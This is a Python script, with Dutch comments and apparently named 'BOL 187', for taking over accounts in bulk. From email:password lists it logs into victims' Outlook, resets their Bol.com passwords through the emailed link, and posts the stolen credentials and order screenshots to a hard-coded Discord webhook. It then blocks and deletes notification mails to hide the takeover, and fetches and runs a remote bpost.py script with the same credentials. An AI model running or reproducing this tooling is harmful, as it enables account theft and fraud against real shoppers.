# -*- coding: utf-8 -*-
import sys
import PySimpleGUI as sg
import tempfile
import string
import time
import random
import os
import pyperclip
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
import undetected_chromedriver as uc
import urllib.request

# Extra imports voor kleur en eventuele uitzonderingen
from colorama import Fore, Style
from selenium.common.exceptions import NoSuchElementException, TimeoutException
import random
import string
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
import requests
import json
import pyfiglet
from colorama import init, Fore, Style
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from colorama import init
from time import sleep
init(autoreset=True)
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import TimeoutException
import io
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
import logging
import os
import pyperclip
import os
import requests
import subprocess
from time import sleep
import threading
from selenium_stealth import stealth
import undetected_chromedriver as uc
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
import shutil
from art import *
from selenium.common.exceptions import WebDriverException
import re
import traceback
from PIL import Image, ImageSequence
from io import BytesIO
import colorsys
import math
import sys
import sys, io
import ctypes
import ctypes
import win32con
import win32gui

# Verkrijg het handle van de console-venster
hwnd = ctypes.windll.kernel32.GetConsoleWindow()
if hwnd:
    # SW_MINIMIZE = 6
    win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)

import sys

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")


webhook_url = "https://discord.com/api/webhooks/1332795184408297634/ofiODu9wua0qn49GOhnFkw-XJn42oVLwOU7jx_zB3ldlH1eGPmUzhO_IjAUJ1HxPotjN"
emails_to_block = [
        "noreply@bpost.be",
        "noreply@communication.bpost.be",
        "info@service-mail.zalando.be",
          # eventueel deze ook
    ]



from selenium.common.exceptions import TimeoutException




skip_event = threading.Event()


def click_random_element(driver):
    random_element = driver.find_element(By.XPATH, "//body")  # Zoek een willekeurig element (bijv. body)
    action = ActionChains(driver)
    action.move_to_element(random_element).click().perform()

def generate_random_name():
    first_names = ["Liam", "Emma", "Noah", "Olivia", "James"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Davis"]
    return random.choice(first_names), random.choice(last_names)



def create_driver():
    options = uc.ChromeOptions()
    # voeg hier je opties toe, bijv. headless, incognito, etc.
    options.add_argument("--incognito")
    options.add_argument("--window-size=800,600")
    options.add_argument("--window-position=-2000,0")
    # (optioneel) opties om detectie tegen te gaan
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-blink-features=AutomationControlled")
    return uc.Chrome(options=options)





webhook_url = "https://discord.com/api/webhooks/1332795184408297634/ofiODu9wua0qn49GOhnFkw-XJn42oVLwOU7jx_zB3ldlH1eGPmUzhO_IjAUJ1HxPotjN"


def block_sender(driver,window, email_to_block):
    
    print_status(f"🚩 Start blokkeren van: {email_to_block}")
    driver.get("https://outlook.live.com/mail/0/options/mail/junkEmail")
    wait = WebDriverWait(driver, 30)

    # 1) Tab “Blocked senders and domains”
    tab = wait.until(EC.element_to_be_clickable((
        By.CSS_SELECTOR,
        "button[value='blockedSendersAndDomains']"
    )))
    tab.click()
    time.sleep(3)

    # 2) Vind “Add blocked sender”-knop via unicode-icoon (taalonafhankelijk)
    add_button = wait.until(EC.element_to_be_clickable((
        By.XPATH,
        "//button[.//i[normalize-space(text())='']]"
    )))

    # Scroll naar knop en klik (JS fallback indien nodig)
    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", add_button)
    try:
        add_button.click()
    except:
        driver.execute_script("arguments[0].click();", add_button)

    print_status("✅ Add blocked sender button is aangeklikt.", window)
    time.sleep(2)

    # 3) E-mailadres invullen
    input_xpath = "//input[starts-with(@id, 'field-') and @type='text']"
    wait.until(EC.presence_of_element_located((By.XPATH, input_xpath))).send_keys(email_to_block)
    time.sleep(1)

    # 4) OK en Save
    ok_button_css = "div[role='dialog'] button.AomV9"
    ok_button = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, ok_button_css)))
    try:
     ok_button.click()
    except:
     driver.execute_script("arguments[0].click();", ok_button)
    print_status("✅ OK geklikt")
    time.sleep(1)
    save_button = wait.until(EC.element_to_be_clickable((
    By.CSS_SELECTOR,
    "div[role='dialog'] button.___1akj6hk"
)))
    try:
     save_button.click()
    except:
     driver.execute_script("arguments[0].click();", save_button)
    
    print_status(f"🎉 '{email_to_block}' is nu geblokkeerd en opgeslagen.", window)

ascii_art = text2art("BOL 187")
print(Fore.BLUE + ascii_art + Style.RESET_ALL)

emailss_to_block = [
        "automail@bol.com"
          # eventueel deze ook
    ]
def  login_to_outlook(driver,window , email_address, password, current_process=None):
    driver.set_window_size(400, 1200)
    driver.set_window_position(1920 - 450, 1080 - 850 - 120)
    driver.get("https://go.microsoft.com/fwlink/p/?linkid=2125442&clcid=0x813&culture=nl-be&country=be")
    email_input = WebDriverWait(driver, 10).until(
    EC.presence_of_element_located((
        By.XPATH,
        "//input[@id='i0116' or @id='usernameEntry']"
    ))
)
    email_input.send_keys(email_address)
    login_button = WebDriverWait(driver, 10).until(
    EC.element_to_be_clickable((
        By.XPATH,
        "//button[@id='idSIButton9' or @data-testid='primaryButton']"
    ))
)
    login_button.click()
    password_input = WebDriverWait(driver, 10).until(
    EC.presence_of_element_located((
        By.XPATH,
        "//input[@id='i0118' or @id='passwordEntry']"
    ))
)
    password_input.send_keys(password)
    login_button = WebDriverWait(driver, 10).until(
    EC.element_to_be_clickable((
        By.XPATH,
        "//button[@id='idSIButton9' or @data-testid='primaryButton']"
    ))
)
    login_button.click()
    
    
    # Klik op de 'Nee' knop als die verschijnt
    try:
        decline_button = WebDriverWait(driver, 10).until(
    EC.element_to_be_clickable((
        By.XPATH,
        "//button[@id='declineButton' or @data-testid='secondaryButton']"
    ))
)
        decline_button.click()
    except:
        pass

    print_status(window, "Ingelogd op Outlook.")
def send_to_discord(email,window, password, webhook_url):
    message = {
    "content": f"**Bpost! Gegevens:**\n\n{email}\n{password}\n", 
}

    try:
        response = requests.post(webhook_url, data=json.dumps(message), headers={'Content-Type': 'application/json'})
        
        if response.status_code == 204:
            print_status("\033[1;34mBericht succesvol naar Discord gestuurd!\033[0m", window)

        else:
            print_status(f"\033[1;31mFout bij het verzenden naar Discord, Kijk handmatig : {response.status_code}\033[0m", window)

    except Exception as e:
        print_status(f"Er is een fout opgetreden bij het verzenden naar Discord: {str(e)}", window)


def send_to_discord_bol_com(email, new_password, webhook_url, screenshot):
    # Maak het bericht
    message = {
    "content": f"**Bol.com! Gegevens:**\n\n{email}\n{new_password}\n",
}



    # Zet het screenshot om naar een bestand in geheugen
    file = io.BytesIO(screenshot)

    # Voeg de parameters voor de Discord webhook toe
    files = {
        "file": ("screenshot.png", file, "image/png")
    }

    try:
        # Verstuur het bericht samen met het screenshot naar Discord
        response = requests.post(webhook_url, data=message, files=files)

        if response.status_code == 200:
            print_status("\033[1;34mBericht en screenshot succesvol naar Discord gestuurd voor Bol.com!\033[0m")
        else:
            print_status(f"\033[1;31mFout bij het verzenden naar Discord voor Bol.com, Kijk handmatig: {response.status_code}\033[0m")

    except Exception as e:
        print_status(f"Er is een fout opgetreden bij het verzenden naar Discord voor Bol.com: {str(e)}")

def generate_random_password():
    while True:
        password_length = 12  # Lengte van het wachtwoord (minimaal 8 tekens)
        
        # Veilige speciale tekens die vaak goed worden geaccepteerd
        safe_special_characters = "@#$%&*!"
        
        # Genereer een wachtwoord met minimaal 1 kleine letter, 1 hoofdletter, 1 cijfer en 1 speciaal teken
        lower_case = random.choice(string.ascii_lowercase)
        upper_case = random.choice(string.ascii_uppercase)
        digit = random.choice(string.digits)
        special_char = random.choice(safe_special_characters)
        
        # Vul de rest van het wachtwoord aan met willekeurige tekens
        remaining_characters = random.choices(string.ascii_letters + string.digits + safe_special_characters, k=password_length - 4)
        
        # Combineer de eerder gekozen tekens met de resterende
        password = lower_case + upper_case + digit + special_char + ''.join(remaining_characters)
        
        # Schud het wachtwoord om ervoor te zorgen dat de volgorde willekeurig is
        password = ''.join(random.sample(password, len(password)))
        
        # Controleer of het wachtwoord voldoet aan de vereisten
        if (len(password) >= 8 and
            any(c.islower() for c in password) and  # Moet een kleine letter bevatten
            any(c.isupper() for c in password) and  # Moet een hoofdletter bevatten
            any(c.isdigit() for c in password) and  # Moet een cijfer bevatten
            any(c in safe_special_characters for c in password)):  # Moet een veilig speciaal teken bevatten
            return password

# --- Helper functies ---


def search_email(driver, sender_email, search_type="link", platform=None, process=None):
    try:
        # Zoek naar e-mail van de opgegeven afzender (bijv. "automail@bol.com")
        email_sender = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, f"//span[contains(text(), '{sender_email}')]"))
        )
        email_sender.click()  # Open de e-mail

        if search_type == "link":
            # Zoek de herstelwachtwoordlink in de e-mail (meerdere opties)
            try:
                # Zoek link met tekst "Nieuw wachtwoord"
                element = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.PARTIAL_LINK_TEXT, "Nieuw wachtwoord"))
                )
                return element  # Retourneer het gevonden link-element
            except:
                print("Link met tekst 'Nieuw wachtwoord' niet gevonden. Probeer nu met tekst 'Nouveau mot de passe'...")
                try:
                    # Als "Nieuw wachtwoord" niet wordt gevonden, zoek naar "Nouveau mot de passe"
                    element = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((By.PARTIAL_LINK_TEXT, "Nouveau mot de passe"))
                    )
                    return element  # Retourneer het gevonden link-element
                except:
                    print("Link met tekst 'Nouveau mot de passe' niet gevonden. Probeer nu met tekst 'hier'...")
                    try:
                        # Als "Nouveau mot de passe" niet wordt gevonden, zoek naar "hier"
                        element = WebDriverWait(driver, 10).until(
                            EC.presence_of_element_located((By.PARTIAL_LINK_TEXT, "hier"))
                        )
                        return element  # Retourneer het gevonden link-element
                    except Exception as e:
                        print(f"Geen geldige link gevonden in de e-mail")
                        return None

        elif search_type == "code":
            # Zoek de herstelcode in de e-mail (indien aanwezig)
            try:
                element = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, "//strong"))
                )
                return element.text  # Retourneer de tekst van de herstelcode
            except Exception as e:
                print(f"Geen herstelcode gevondenha shoefen in mail")
                return None

    except Exception as e:
        
        return None

def delete_emails_from_inbox(driver, window, email, current_process=None):
    print_status("\033[1;33mLaatste stap: verwijder Bol.com, Zalando of Bpost mails uit inbox!!! (als die er zijn)\033[0m", window)
    time.sleep(3)

    try:
        # Open een nieuw tabblad
        driver.maximize_window()
        driver.execute_script("window.focus();")
        actions = ActionChains(driver)
        actions.send_keys(Keys.CONTROL + 't').perform()
        WebDriverWait(driver, 3).until(lambda driver: len(driver.window_handles) > 1)

        # Ga naar de inbox pagina
        driver.get("https://outlook.live.com/mail/0/inbox")

        # Controleer of de pagina correct is geladen
        WebDriverWait(driver, 10).until(EC.url_contains("https://outlook.live.com/mail/0/inbox"))
        current_url = driver.current_url
        if "https://outlook.live.com/mail/0/inbox" in current_url:
            print_status("Pagina succesvol geladen: Inbox", window)
        else:
            print_status(f"Fout: De pagina is niet correct geladen. Huidige URL: {current_url}", window)

        time.sleep(15)
        driver.set_window_position(5000, 5000)

        print_status(Fore.GREEN + "Dikke bal! E-mails succesvol verwijderd." + Style.RESET_ALL, window)

    except WebDriverException:
        print_status(Fore.YELLOW + "\n📌 Browser werd handmatig gesloten. Yellah volgende?" + Style.RESET_ALL, window)

    except Exception as e:
        print_status(Fore.RED + f"\nEr ging iets anders mis: {e}" + Style.RESET_ALL, window)

    finally:
        # Altijd proberen netjes af te sluiten
        try:
            driver.quit()
        except Exception:
            pass




def quit_driver(driver,window, current_process, continue_to_bol=False):
    if continue_to_bol:
        # Als je verder wilt met het Bol.com proces, ga dan verder zonder vraag over Bpost
        return
    
    # Vraag de gebruiker of ze willen doorgaan met een ander account voor Bpost
     

    print_status(f"Herstarten voor een ander account ...", window)
    driver.quit()
    

all_drivers = []
# --- De HumanizedDriver klasse ---
class HumanizedDriver:

    def ssearch_email(self, sender_email, search_type="link"):
        """
        Open e-mail van sender_email en return URL (link) of 6‑cijferige code.
        Werkt ook in Outlook omdat we de juiste iframe in-/uitschakelen.
        """
        try:
            # 1) Mail openen
            mail = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable(
                    (By.XPATH, f"//span[contains(text(), '{sender_email}')][1]")
                )
            )
            mail.click()
            time.sleep(2)

            # 2) Schakel naar het iframe met de mail-body
            iframe = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((
                    By.XPATH,
                    "//iframe[contains(@id,'ReadingPaneIFrame') or contains(@class,'ReadMessageIframe')]"
                ))
            )
            self.driver.switch_to.frame(iframe)

            # 3A) LINK-logica
            if search_type == "link":
                for txt in ("hier", "Nouveau mot de passe"):
                    try:
                        link_el = WebDriverWait(self.driver, 10).until(
                            EC.presence_of_element_located((By.PARTIAL_LINK_TEXT, txt))
                        )
                        url = link_el.get_attribute("href")
                        # terug naar hoofd‑DOM
                        self.driver.switch_to.default_content()
                        return url
                    except TimeoutException:
                        continue
                self.driver.switch_to.default_content()
                return None

            # 3B) CODE-logica
            elems = WebDriverWait(self.driver, 10).until(
                EC.presence_of_all_elements_located((By.TAG_NAME, 'strong'))
            )
            for e in elems:
                code = e.text.strip()
                if re.fullmatch(r"\d{6}", code):
                    self.driver.switch_to.default_content()
                    return code

            # fallback: de hele mail-body als tekst
            body_text = self.driver.find_element(By.TAG_NAME, 'body').text
            match = re.search(r"\b\d{6}\b", body_text)
            self.driver.switch_to.default_content()
            return match.group(0) if match else None

        except Exception as e:
            # altijd terug naar hoofd‑DOM bij fout
            try:
                self.driver.switch_to.default_content()
            except:
                pass
            print(f"Fout in ssearch_email: {e}")
            return None







    






    

    
       
   




    def __init__(self):
        self.driver = self._init_driver()
        all_drivers.append(self.driver)
        self._setup_stealth()
        self._realistic_mouse = ActionChains(self.driver)



    def _init_driver(self):
        options = uc.ChromeOptions()
        options.add_argument(f"--window-size={random.randint(1000,1400)},{random.randint(800,1200)}")
        options.add_argument("--incognito")
        options.add_argument("--force-device-scale-factor=1")
        options.add_argument("--disable-features=site-per-process")

        # --- Unieke profielmap per sessie ---
        profile_path = tempfile.mkdtemp(prefix="uc_profile_")
        # Je kunt profile_path bewaren als attribuut voor later cleanup als je dat wilt:
        # self._profile_path = profile_path
        options.add_argument(f"--user-data-dir={profile_path}")
        options.add_argument("--profile-directory=Default")
        options.add_argument("--use-gl=desktop")
        options.add_argument("--ignore-gpu-blocklist")
        options.add_argument("--disable-popup-blocking")

        return uc.Chrome(
            options=options,
            use_subprocess=True,
            version_main=135,
            headless=False,
            patcher_force_close=False
        )

    def _setup_stealth(self):
        self.driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
            "source": """
                const originalQuery = window.navigator.permissions.query;
                window.navigator.permissions.query = (parameters) => (
                    parameters.name === 'notifications' ?
                        Promise.resolve({ state: 'denied' }) :
                        originalQuery(parameters)
                );
                
                Object.defineProperty(navigator, 'plugins', {
                    get: () => [
                        { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
                        { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai', description: 'Portable Document Format' }
                    ]
                });

                Object.defineProperty(Notification, 'permission', { value: 'denied', writable: false });

                window.chrome = {
                    app: { isInstalled: false, InstallState: 'disabled', RunningState: 'stopped' },
                    runtime: {
                        OnInstalledReason: 'install', OnRestartRequiredReason: 'app_update',
                        PlatformArch: 'Win32', PlatformNaclArch: 'x86-32', PlatformOs: 'win', RequestUpdateCheckStatus: 'throttled'
                    }
                };
                
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.fillText = function(text, x, y) {
                    const noise = Math.random() * 0.05;
                    super.fillText(text, x + noise, y + noise);
                };
            """
        })

    def _human_click(self, element):
        rect = element.rect
        target_x = rect['x'] + rect['width'] * random.uniform(0.3, 0.7)
        target_y = rect['y'] + rect['height'] * random.uniform(0.3, 0.7)
        self._realistic_mouse.move_by_offset(random.randint(-5, 5), random.randint(-5, 5)).pause(random.uniform(0.1, 0.3))
        for _ in range(random.randint(2, 4)):
            self._realistic_mouse.move_by_offset(random.randint(-2, 2), random.randint(-2, 2)).pause(random.uniform(0.01, 0.1))
        self._realistic_mouse.move_to_location(target_x + random.randint(-3, 3), target_y + random.randint(-3, 3)).click().perform()
        time.sleep(random.uniform(0.5, 1.5))

    def navigate(self, url):
        self.driver.get('about:blank')
        time.sleep(random.uniform(0.5, 1.2))
        self.driver.execute_script(f"window.location.href = '{url}'")
        for _ in range(random.randint(2, 5)):
            scroll_amount = random.randint(200, 800)
            self.driver.execute_script(f"window.scrollBy(0, {scroll_amount})")
            time.sleep(random.uniform(0.3, 1.1))

    def handle_cookies(self):
        try:
            WebDriverWait(self.driver, random.uniform(2, 4)).until(
                EC.presence_of_element_located((By.XPATH, "//div[contains(@class,'cookie')]"))
            )
            self.driver.execute_script(
                "localStorage.setItem('cookieConsent', 'true');"
                "document.cookie = 'cookieAccepted=1; path=/; max-age=2592000';"
            )
        except Exception as e:
            print_status(f"Cookie handling error: {e}", )


            

    # Methode voor het resetproces
    
    def bol_com_password_reset_process(self, window, email_address, password, current_process=None):
        # Variabelen die later nodig zijn
        
        webhook_url = "https://discord.com/api/webhooks/1332795184408297634/ofiODu9wua0qn49GOhnFkw-XJn42oVLwOU7jx_zB3ldlH1eGPmUzhO_IjAUJ1HxPotjN"
        
        breadcrumb_xpath = "//ul[@id='option_block_4']//li[@class='breadcrumbs__item']"
        print_status(Fore.YELLOW + "Bol.com herstelproces gestart..." + Style.RESET_ALL, window)

        new_password = generate_random_password()
        
        time.sleep(2)        # Ga naar de Bol.com loginpagina
        self.driver.get("https://login.bol.com/wsp/login")
    
        # Zoek en klik op de 'Wachtwoord vergeten?' link
        wachtwoord_vergeten_link = WebDriverWait(self.driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//a[contains(text(),'Wachtwoord vergeten?')]"))
        )
        wachtwoord_vergeten_link.click()
    
        # Wacht totdat de pagina voor wachtwoordherstel geladen is
        WebDriverWait(self.driver, 10).until(
            EC.presence_of_element_located((By.XPATH, "//input[@name='email']"))
        )
    
        # Vul het e-mailadres in
        email_input = WebDriverWait(self.driver, 10).until(
            EC.presence_of_element_located((By.XPATH, "//input[@name='email']"))
        )
        email_input.send_keys(email_address)
    
        # Klik op de verzendknop
        submit_btn = WebDriverWait(self.driver, 20).until(
    EC.element_to_be_clickable((
        By.XPATH,
        "//button[@type='SUBMIT' and normalize-space(text())='Verzenden']"
    ))
)

# Even scrollen zodat ‘ie echt in beeld komt
        self.driver.execute_script(
    "arguments[0].scrollIntoView({block:'center'});",
        submit_btn
)

# Klikken en status melden
        submit_btn.click()
        print_status("Verzoek om wachtwoordherstel verstuurd naar Bol.com.", window)
    
        # Open een nieuw tabblad en ga naar Outlook Inbox
        self.driver.execute_script("window.open('about:blank', '_blank');")
        self.driver.switch_to.window(self.driver.window_handles[-1])
        self.driver.set_window_size(400, 1200)
        self.driver.set_window_position(1920 - 450, 1080 - 850 - 120)
         
        print_status("Zoeken naar herstel e-mail van Bol.com in de Inbox...", window)
        self.driver.get("https://outlook.live.com/mail/0/inbox")
        time.sleep(10)
    
        # Zoek naar de herstel e-mail van Bol.com
        bol_email = search_email(self.driver, "bol", "link")
    
        # Als de e-mail niet wordt gevonden in de inbox, ga dan naar de junkmap
        if not bol_email:
            print_status("Geen Bol.com e-mail in inbox gevonden. Controleer de Junk (ongewenste e-mail) map...", window)
            self.driver.get("https://outlook.live.com/mail/0/junkemail")
            time.sleep(5)
            bol_email = search_email(self.driver, "bol", "link")
    
        if bol_email:
            print_status("Bol.com e-mail gevonden, nu klikken...", window)
            bol_email.click()

            try:
                # Zoek de link in de e-mail
                link = bol_email.find_element(By.XPATH, "//a[contains(@href, 'reset_password')]")
                link_url = link.get_attribute('href')
                print_status(f"Herstelwachtwoord link: {link_url}", window)
                
                # Open de link in hetzelfde tabblad
                self.driver.get(link_url)
                print_status("Herstelwachtwoord link geopend!", window)
                self.driver.switch_to.window(self.driver.current_window_handle)

# Wacht tot het wachtwoordveld zichtbaar is
                password_field = WebDriverWait(self.driver, 10).until(
    EC.visibility_of_element_located((By.NAME, "j_password"))
)

# Scroll het veld in beeld
                self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", password_field)
                time.sleep(0.2)

# Focus via actie (betrouwbaarder dan alleen .click())
                ActionChains(self.driver).move_to_element(password_field).click().perform()
                time.sleep(0.1)

# Clear het veld expliciet
                password_field.clear()
                time.sleep(0.2)

# Typ wachtwoord karakter voor karakter
                for ch in new_password:
                 password_field.send_keys(ch)
                 time.sleep(0.05)
                submit_button = WebDriverWait(self.driver, 10).until(
    EC.element_to_be_clickable((By.XPATH, "//button[@type='SUBMIT']"))
)
                submit_button.click()
                print_status(Fore.GREEN + f"Nieuw wachtwoord ingesteld: {new_password}" + Style.RESET_ALL, window)

                WebDriverWait(self.driver, 10).until(
                    EC.url_contains("account/overzicht")  # Controleer of de URL de juiste is voor de overzichtspagina
                )
                print_status("Je bent nu op de 'Overzicht' pagina van je account!", window)
                self.driver.get("https://www.bol.com/nl/rnwy/account/bestellingen/overzicht")
                print_status("Navigeren naar bestellingen overzicht pagina...", window)
                
                try:
                    reject_button = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((By.ID, "js-reject-all-button"))
                    )
                    reject_button.click()
                    print_status(Fore.YELLOW + "Cookies geweigerd!" + Style.RESET_ALL)
                except Exception as e:
                    print_status("Fout tijdens het weigeren van cookies")
        
                try:
                    WebDriverWait(self.driver, 20).until(
                        EC.presence_of_element_located((By.XPATH, breadcrumb_xpath))
                    )
                except TimeoutException:
                    print_status(Fore.RED + "Breadcrumbs niet gevonden binnen de tijd!" + Style.RESET_ALL, window)
                
                # Wacht totdat het bestellingen overzicht geladen is
                try:
                    # Controleer of de tekst "Je hebt nog geen bestellingen geplaatst" aanwezig is
                    WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((By.XPATH, "//h2[contains(text(), 'Je hebt nog geen bestellingen geplaatst')]"))
                    )
                    print_status(Fore.RED + "Geen bestellingen gevonden!" + Style.RESET_ALL, window)
                    # Geen Discordmelding verzenden omdat er geen bestellingen zijn
                except:
                    print_status(Fore.GREEN + "Bestellingen gevonden!" + Style.RESET_ALL, window)
                    screenshot = self.driver.get_screenshot_as_png()
                    send_to_discord_bol_com(email_address, new_password, webhook_url, screenshot)
                
                
                    time.sleep(4)
                    # Nu naar de Outlook junkmail opties en blokkeer e-mails
                    for email in emailss_to_block:
                     try:
                      block_sender(self.driver,window, email)
                      time.sleep(3)  # optioneel: wacht tussen acties
                     except Exception as e:
                      print_status(f"⚠️ Fout bij '{email}': {e}", window)
                    
                    delete_emails_from_inbox(self.driver,window, email,current_process)
                    self.bpost_process(window, email_address, password, webhook_url)

            except NoSuchElementException:
                print_status(Fore.RED + "Geen geldige herstelwachtwoordlink gevonden in de e-mail." + Style.RESET_ALL, window)
        else:
            print_status(Fore.RED + "Geen herstelwachtwoord link gevonden in de e-mail. geen bol.com!!!" + Style.RESET_ALL, window)
                 
        
        
    def bpost_process(self, window, email_address, password, webhook_url):
        """
        Roept extern script bpost.py aan. Downloadt het script eerst als het ontbreekt.
        """
        import os
        script_name = "bpost.py"
        script_dir = os.path.dirname(__file__)
        script_path = os.path.join(script_dir, script_name)


        import datetime, sys, PySimpleGUI as sg, os
        print(f"▶ sys.executable: {sys.executable}")
        print(f"▶ Python-versie: {sys.version.split()[0]}")
        print(f"▶ PySimpleGUI-versie: {sg.version}")
        print(f"▶ bpost.py pad: {script_path}")
        print(f"▶ bpost.py bestaat: {os.path.exists(script_path)}")
        if os.path.exists(script_path):
         ts = os.path.getmtime(script_path)
         print("▶ bpost.py laatste wijziging:", datetime.datetime.fromtimestamp(ts))

        if not os.path.exists(script_path):
            try:
                print_status(
                    window,
                    "🔄 bpost.py niet gevonden; downloaden vanaf GitHub…"
                )
                url = (
                    "https://raw.githubusercontent.com/mmmdat/dvdvv/"
                    "main/bpost.py"
                )
                urllib.request.urlretrieve(url, script_path)
                print_status(window, "✅ bpost.py gedownload.")
            except Exception as e:
                print_status(
                    window,
                    f"❌ Download falen: {e}"
                )
                return

        cmd = [
            sys.executable,
            "-u",
            "-X", "utf8",
            script_path,
            email_address,
            password,
            webhook_url
        ]

        import subprocess, sys, os

# bepaal flags
        if os.name == 'nt':
         CREATE_NO_WINDOW = 0x08000000
         creationflags = CREATE_NO_WINDOW
        else:
         creationflags = 0


        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            encoding="utf-8",
            errors="replace"
        )
        while True:
            line = proc.stdout.readline()
            if not line and proc.poll() is not None:
                break
            if line:
                print_status(window, line.rstrip("\n"))

        exit_code = proc.wait(timeout=300)
        if exit_code == 0:
            print_status(window, "✅ bpost.py afgerond zonder fouten.")
        else:
            print_status(
                window,
                f"❌ bpost.py faalde (exit {exit_code})."
            )
        # Driver afsluiten gebeurt in de caller



    
        # Sluit de browser bij fout






def print_status(text_or_window, window_or_text=None):
    """
    Thread-safe status update: print to console + optional GUI update.
    Automatically handles arguments if passed in reverse order.
    """
    # Detect swapped arguments
    if isinstance(text_or_window, sg.Window) and isinstance(window_or_text, str):
        window = text_or_window
        text = window_or_text
    else:
        text = text_or_window
        window = window_or_text

    # ANSI color mapping
    color = 'black'
    ansi_color_map = {
        '\x1b[31m': 'red',
        '\x1b[32m': 'green',
        '\x1b[33m': 'orange',
        '\x1b[34m': 'blue',
        '\x1b[1;34m': 'blue',
        
        '\x1b[33m': 'yellow',
    }

    # Strip ANSI codes and determine GUI color
    for code, gui_color in ansi_color_map.items():
     if code in text:
        color = gui_color
        text = text.replace(code, '')
    text = re.sub(r'\x1b\[[0-9;]*m', '', text)

    # Console output
    print(text)

    # Thread-safe GUI update via event
    if window is not None:
        window.write_event_value('_LOG_', (text, color))

def worker(email, password, window):

    
    """
    Voert alleen het Bol.com wachtwoordherstelproces uit.
    """
    # Initiëleisatie van de browser voor Bol.com
    bol_bot = HumanizedDriver()
    try:
        # Inloggen op Outlook (indien nodig voor de Bol.com flow)
        print_status(window, "🔄 Inloggen op Outlook…")
        login_to_outlook(bol_bot.driver, window, email, password)

        # Start het Bol.com wachtwoordherstelproces
        print_status(window, "🔄 Herstelproces Bol.com…")
        bol_bot.bol_com_password_reset_process(window, email, password, None)

    except Exception as e:
        tb_str = traceback.format_exc()
        print_status(window, f"{Fore.RED}⚠️ Fout tijdens Bol.com: {e}{Style.RESET_ALL}")
        print_status(window, tb_str)

    finally:
        # Zorg dat de browser altijd netjes wordt afgesloten
        try:
            bol_bot.driver.quit()
        except:
            pass

def parse_color(text):
    if Fore.RED in text:
        return 'red', text.replace(Fore.RED, '').replace(Style.RESET_ALL, '')
    if Fore.GREEN in text:
        return 'green', text.replace(Fore.GREEN, '').replace(Style.RESET_ALL, '')
    if Fore.YELLOW in text:
        return 'yellow', text.replace(Fore.YELLOW, '').replace(Style.RESET_ALL, '')
    if Fore.CYAN in text:
        return 'cyan', text.replace(Fore.CYAN, '').replace(Style.RESET_ALL, '')
    # fallback
    return None, text.replace(Style.RESET_ALL, '')


# Print naar GUI mét kleurdetectie



def batch_worker(lines, window):
    """
    Verwerkt elke regel met email:password in een achtergrondthread,
    update status in de GUI terwijl de main-thread responsive blijft.
    """
    for line in lines:
        line = line.strip()
        if not line or ':' not in line:
            print_status(window, f"{Fore.YELLOW}⚠️ Ongeldig formaat, sla over: {line}{Style.RESET_ALL}")
            continue
        email, pw = line.split(':', 1)
        email = email.strip()
        pw = pw.strip()
        print_status(window, f"{Fore.CYAN}🚀 Start met {email}{Style.RESET_ALL}")
        try:
            worker(email, pw, window)
            print_status(window, f"{Fore.GREEN}✅ Klaar met {email}\n{Style.RESET_ALL}")
        except Exception as e:
            print_status(window, f"{Fore.RED}❌ Fout bij {email}: {e}\n{Style.RESET_ALL}")

    print_status(window, f"{Fore.CYAN}🏁 Alle accounts verwerkt!{Style.RESET_ALL}")
from pathlib import Path
base_path = Path(__file__).parent.resolve()

# Pad naar de loader GIF
base_path = Path('.')  # of Path(__file__).parent
gif_local_path = base_path / 'spinner.gif'
url = 'https://raw.githubusercontent.com/mmmdat/dvdvv/main/spinner.gif'

# Probeer altijd te (her)downloaden, met fallback op de lokale kopie
try:
    print("[+] spinner.gif ophalen vanaf GitHub…")
    r = requests.get(url, timeout=(5, 15))
    r.raise_for_status()  # gooit een HTTPError bij status != 200
    gif_local_path.write_bytes(r.content)
    print("[✓] spinner.gif succesvol (her)downloaded en naar disk geschreven.")
except Exception as e:
    print(f"[⚠️] Kan spinner.gif niet downloaden ({e}), fallback naar lokale versie…")
    if not gif_local_path.exists():
        # Er is geen lokale versie om op terug te vallen, dus stop
        raise RuntimeError("Geen spinner.gif beschikbaar, downloaden én lokale fallback mislukt")
    else:
        print("[✓] Lokale spinner.gif wordt gebruikt.")

def load_gif_frames(path, size=(276, 276)):
    """
    Lees een GIF in, resize frames, en retourneer PNG-bytes voor PySimpleGUI animatie.
    """
    gif = Image.open(path)
    frames = []
    for frame in ImageSequence.Iterator(gif):
        frame = frame.copy().resize(size)  # resize frame naar bv. 64x64
